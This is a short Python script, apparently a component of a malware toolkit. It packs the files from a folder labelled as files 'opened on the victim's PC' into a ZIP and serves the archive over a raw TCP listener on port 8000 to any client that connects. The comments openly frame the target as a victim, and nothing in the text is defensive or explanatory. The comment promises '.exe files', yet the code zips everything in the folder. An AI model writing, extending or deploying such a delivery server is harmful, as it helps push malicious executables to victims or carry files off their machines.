import socket
import zipfile
import os

# Create a ZIP archive from .exe files in the specified folder
def create_zip():
    with zipfile.ZipFile('files_to_send.zip', 'w') as zipf:
        for file in os.listdir(r"directory to files that are opened on the victim's PC"): # 
            zipf.write(os.path.join(r"directory to files that are opened on the victim's PC", file), arcname=file)

def send_file():
    create_zip() 
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(("Server IP address", 8000))
    server_socket.listen(1)
    print("Waiting for connection")
    
    client_socket, client_address = server_socket.accept()
    print(f"Connected {client_address}")
    
    
    with open('files_to_send.zip', 'rb') as file:
        while True:
            data = file.read(1024)  
            if not data:
                break
            client_socket.sendall(data)
                
        print("File sent")
 
    client_socket.close()
    server_socket.close()
    
    

send_file()
